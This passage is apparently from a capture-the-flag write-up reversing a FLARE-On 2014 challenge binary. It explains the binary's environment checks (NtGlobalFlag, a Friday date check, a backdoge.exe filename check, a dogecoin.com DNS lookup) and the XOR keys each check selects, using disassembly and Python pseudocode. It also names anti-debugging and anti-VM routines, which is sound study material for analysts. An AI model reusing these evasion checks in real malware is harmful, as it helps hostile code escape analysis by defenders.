style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">5
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#719e07>if</span> (NtGlobalFlag <span style=color:#719e07>==</span> <span style=color:#2aa198>0x70</span>):
</span></span><span style=display:flex><span>    blob <span style=color:#719e07>=</span> xor(blob,<span style=color:#2aa198>&#34;Feel the sting of the monarch!&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#719e07>else</span>:
</span></span><span style=display:flex><span>    blob <span style=color:#719e07>=</span> xor(blob,<span style=color:#2aa198>&#34;</span><span style=color:#cb4b16>\x09\x00\x00\x01</span><span style=color:#2aa198>&#34;</span>)</span></span></code></pre></td></tr></table></div></div></div></figure><h4 id=function-8---sands-of-time>Function 8 - Sands of Time
<a class=header-link href=#function-8---sands-of-time><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h4><figure class=code><figcaption><span></span></figcaption><div class=codewrapper><div class=highlight><div style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">12
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-nasm data-lang=nasm><span style=display:flex><span>.text:00401<span style=color:#268bd2>B13</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>isDebuggerPresent</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B18</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>BeingDebugged</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B1D</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>VMware_detection</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B22</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>Electric_Boogaloo</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B27</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>OutputDebugString</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B2C</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>ICanHaz?</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B31</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>NtGlobalFlag</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B36</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>sub_401460</span>     <span style=color:#586e75>; you are here</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B3B</span> <span style=color:#268bd2>mov</span>     <span style=color:#b58900>eax</span>, [<span style=color:#b58900>esi</span>]
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B3D</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>sub_4014F0</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B42</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>sub_401590</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B47</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>sub_4016F0</span></span></span></code></pre></td></tr></table></div></div></div></figure><p><img src=/images/2014/flare/7-13.jpg alt="Checking day of the week" title="Checking day of the week"></p><p>This is not a countermeasure but a simple check. First <code>time64</code> is called and returns the number of seconds since January 1st 1970. Then <code>localtime64</code> converts it to <a href=http://msdn.microsoft.com/en-us/library/bf12f0hc.aspx target=_blank rel="noreferrer noopener">readabled format</a> stored in a structure of type <code>tm</code> according to MSDN:</p><figure class=code><figcaption><span>tm</span></figcaption><div class=codewrapper><div class=highlight><div style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">11
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#586e75>// each field is an int (4 bytes)
</span></span></span><span style=display:flex><span><span style=color:#586e75></span>
</span></span><span style=display:flex><span>tm_sec:     Seconds after minute (<span style=color:#2aa198>0</span> – <span style=color:#2aa198>59</span>)
</span></span><span style=display:flex><span>tm_min:     Minutes after hour (<span style=color:#2aa198>0</span> – <span style=color:#2aa198>59</span>)
</span></span><span style=display:flex><span>tm_hour:    Hours after midnight (<span style=color:#2aa198>0</span> – <span style=color:#2aa198>23</span>)
</span></span><span style=display:flex><span>tm_mday:    Day of month (<span style=color:#2aa198>1</span> – <span style=color:#2aa198>31</span>)
</span></span><span style=display:flex><span>tm_mon:     Month (<span style=color:#2aa198>0</span> – <span style=color:#2aa198>11</span>; January <span style=color:#719e07>=</span> <span style=color:#2aa198>0</span>)
</span></span><span style=display:flex><span>tm_year:    Year (current year minus <span style=color:#2aa198>1900</span>)
</span></span><span style=display:flex><span>tm_wday:    Day of week (<span style=color:#2aa198>0</span> – <span style=color:#2aa198>6</span>; Sunday <span style=color:#719e07>=</span> <span style=color:#2aa198>0</span>) <span style=color:#719e07>:</span> offset: <span style=color:#2aa198>24</span>
</span></span><span style=display:flex><span>tm_yday:    Day of year (<span style=color:#2aa198>0</span> – <span style=color:#2aa198>365</span>; January <span style=color:#2aa198>1</span> <span style=color:#719e07>=</span> <span style=color:#2aa198>0</span>)
</span></span><span style=display:flex><span>tm_isdst:   Positive value <span style=color:#719e07>if</span> daylight saving time is in effect; <span style=color:#2aa198>0</span> <span style=color:#719e07>if</span> daylight saving time is not in effect; negative value <span style=color:#719e07>if</span> status of daylight saving time is unknown</span></span></code></pre></td></tr></table></div></div></div></figure><p>Next instruction <code>cmp dword ptr [eax+18h], 5</code> compares 24th (0x16) byte of the structure with 5. Because each field is of type <code>int</code> and 4 bytes, 24th byte will be the current day of the week. Sunday is 0, so Friday is 5. The application simply checks if it is Friday. If so, it will xor <code>! 50 1337</code> with the blob and if it is not Friday blob will be xor-ed with <code>1337</code>.</p><figure class=code><figcaption><span>Day of the week check</span></figcaption><div class=codewrapper><div class=highlight><div style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">4
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#719e07>if</span> (Friday):
</span></span><span style=display:flex><span>    blob <span style=color:#719e07>=</span> xor(blob,<span style=color:#2aa198>&#34;! 50 1337&#34;</span>)
</span></span><span style=display:flex><span><span style=color:#719e07>else</span>:
</span></span><span style=display:flex><span>    blob <span style=color:#719e07>=</span> xor(blob,<span style=color:#2aa198>&#34;1337&#34;</span>)</span></span></code></pre></td></tr></table></div></div></div></figure><h4 id=function-9---backdogeexe>Function 9 - Backdoge.exe
<a class=header-link href=#function-9---backdogeexe><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h4><figure class=code><figcaption><span></span></figcaption><div class=codewrapper><div class=highlight><div style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">12
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-nasm data-lang=nasm><span style=display:flex><span>.text:00401<span style=color:#268bd2>B13</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>isDebuggerPresent</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B18</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>BeingDebugged</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B1D</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>VMware_detection</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B22</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>Electric_Boogaloo</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B27</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>OutputDebugString</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B2C</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>ICanHaz?</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B31</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>NtGlobalFlag</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B36</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>SandsOfTime</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B3B</span> <span style=color:#268bd2>mov</span>     <span style=color:#b58900>eax</span>, [<span style=color:#b58900>esi</span>]   <span style=color:#586e75>; eax = executable&#39;s name</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B3D</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>sub_4014F0</span>   <span style=color:#586e75>; you are here</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B42</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>sub_401590</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B47</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>sub_4016F0</span></span></span></code></pre></td></tr></table></div></div></div></figure><p>Before next function, executable's complete path is saved into <code>eax</code>. Then <code>sub_4014F0</code> is called.</p><p><img src=/images/2014/flare/7-14.jpg alt="Comparing executable's name with backdoge.exe" title="Comparing executable's name with backdoge.exe"></p><p>Again, this is just a check. Executable's name is compared with <code>backdoge.exe</code> two characters in each iteration.</p><p><img src=/images/2014/flare/7-15.jpg alt="Filename check" title="Filename check"></p><p>The rest is pretty easy. If filename check passes, <code>MATH IS HARD</code> will be xor-ed with the blob and if not <code>LETS GO SHOPPING</code>.</p><figure class=code><figcaption><span>Filename check</span></figcaption><div class=codewrapper><div class=highlight><div style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">4
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#719e07>if</span> (filename <span style=color:#719e07>==</span> <span style=color:#2aa198>&#34;BackDoge.exe&#34;</span>):
</span></span><span style=display:flex><span>    blob <span style=color:#719e07>=</span> xor(blob,<span style=color:#2aa198>&#34;MATH IS HARD&#34;</span>)
</span></span><span style=display:flex><span><span style=color:#719e07>else</span>:
</span></span><span style=display:flex><span>    blob <span style=color:#719e07>=</span> xor(blob,<span style=color:#2aa198>&#34;LETS GO SHOPPING&#34;</span>)</span></span></code></pre></td></tr></table></div></div></div></figure><h4 id=function-10---dogecoincom-ip-check>Function 10 - Dogecoin.com IP Check
<a class=header-link href=#function-10---dogecoincom-ip-check><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h4><figure class=code><figcaption><span></span></figcaption><div class=codewrapper><div class=highlight><div style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">12
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-nasm data-lang=nasm><span style=display:flex><span>.text:00401<span style=color:#268bd2>B13</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>isDebuggerPresent</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B18</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>BeingDebugged</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B1D</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>VMware_detection</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B22</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>Electric_Boogaloo</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B27</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>OutputDebugString</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B2C</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>ICanHaz?</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B31</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>NtGlobalFlag</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B36</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>SandsOfTime</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B3B</span> <span style=color:#268bd2>mov</span>     <span style=color:#b58900>eax</span>, [<span style=color:#b58900>esi</span>]
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B3D</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>BackDoge</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B42</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>sub_401590</span>   <span style=color:#586e75>; you are here</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B47</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>sub_4016F0</span></span></span></code></pre></td></tr></table></div></div></div></figure><p>Another check. This time the application retrieves the IP for <code>www.dogecoin.com</code> using <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms738524%28v=vs.85%29.aspx" target=_blank rel="noreferrer noopener">gethostbyname</a>. The result is of the form <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms738552%28v=vs.85%29.aspx" target=_blank rel="noreferrer noopener">hostent</a>:</p><figure class=code><figcaption><span>hostent structure (for Win32)</span></figcaption><div class=codewrapper><div class=highlight><div style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">7
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#719e07>typedef</span> <span style=color:#719e07>struct</span> <span style=color:#268bd2>hostent</span> {
</span></span><span style=display:flex><span>  <span style=color:#dc322f>char</span> FAR      <span style=color:#719e07>*</span>h_name;        <span style=color:#586e75>// index: 0
</span></span></span><span style=display:flex><span><span style=color:#586e75></span>  <span style=color:#dc322f>char</span> FAR  FAR <span style=color:#719e07>**</span>h_aliases;    <span style=color:#586e75>// index: 4
</span></span></span><span style=display:flex><span><span style=color:#586e75></span>  <span style=color:#dc322f>short</span>         h_addrtype;     <span style=color:#586e75>// index: 8
</span></span></span><span style=display:flex><span><span style=color:#586e75></span>  <span style=color:#dc322f>short</span>         h_length;       <span style=color:#586e75>// index: 9
</span></span></span><span style=display:flex><span><span style=color:#586e75></span>  <span style=color:#dc322f>char</span> FAR  FAR <span style=color:#719e07>**</span>h_addr_list;
</span></span><span style=display:flex><span>} HOSTENT, <span style=color:#719e07>*</span>PHOSTENT, FAR <span style=color:#719e07>*</span>LPHOSTENT;</span></span></code></pre></td></tr></table></div></div></div></figure><p><img src=/images/2014/flare/7-16.jpg alt="Dogecoin.com IP" title="Dogecoin.com IP"></p><p>Then 8th byte will be compared with <code>2</code> which is <code>h_addrtype</code>. According to this <a href=http://stackoverflow.com/q/2549461 target=_blank rel="noreferrer noopener">stackoverflow answer</a>, it is <code>AF_INET</code> or <code>PF_INET</code> defined in <a href=http://repo-genesis3.cbi.utsa.edu/crossref/ns-sli/usr/include/bits/socket.h.html target=_blank rel="noreferrer noopener">bits/socket.h</a>.</p><p><code>inet_ntoa</code> is converting the IP to ASCII IPv4 format (e.g. 192.168.0.1) and comparing it to <code>127.0.0.1</code> two characters at a time like last check.</p><p><img src=/images/2014/flare/7-17.jpg alt="xor paths for ip check" title="xor paths for ip check"></p><p>The xor-string is <code>LETS GO MATH</code> if the resolved IP address is not <code>127.0.0.1</code>. If the IP address is <code>127.0.0.1</code> or <code>h_addrtype</code> is not <code>2</code> then <code>SHOPPING IS HARD</code> will be xor-ed with the blob.</p><figure class=code><figcaption><span>Dogecoin.com IP check</span></figcaption><div class=codewrapper><div class=highlight><div style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">4
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#719e07>if</span> (h_addrtype <span style=color:#719e07>!=</span> <span style=color:#2aa198>2</span> <span style=color:#719e07>or</span> (Dogecoin_ip <span style=color:#719e07>==</span> <span style=color:#2aa198>&#34;127.0.0.1&#34;</span>)):
</span></span><span style=display:flex><span>    blob <span style=color:#719e07>=</span> xor(blob,<span style=color:#2aa198>&#34;SHOPPING IS HARD&#34;</span>)
</span></span><span style=display:flex><span><span style=color:#719e07>if</span> (Dogecoin_ip <span style=color:#719e07>!=</span> <span style=color:#2aa198>&#34;127.0.0.1&#34;</span>):
</span></span><span style=display:flex><span>    blob <span style=color:#719e07>=</span> xor(blob,<span style=color:#2aa198>&#34;LETS GO MATH&#34;</span>)</span></span></code></pre></td></tr></table></div></div></div></figure><h4 id=function-11---hour-of-the-wolf>Function 11 - Hour of the Wolf
